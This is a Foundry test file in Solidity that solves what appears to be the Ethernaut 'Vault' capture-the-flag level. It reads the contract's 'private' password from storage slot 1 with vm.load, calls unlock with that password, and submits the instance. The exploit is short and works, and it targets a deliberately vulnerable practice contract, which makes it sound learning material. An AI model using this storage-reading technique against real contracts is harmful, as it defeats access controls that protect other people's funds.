// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract VaultTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);
  }

  function testExploit() public {
    // as reading another's contract storage
    // is not supported by solidity (i.e. It needs a forge "cheatcode"),
    // imagine this attack being made from a forge script
    bytes32 password = vm.load(challengeAddress, bytes32(uint256(1)));

    // too lazy to write code for an interface? Just do the call
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes32)", password));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
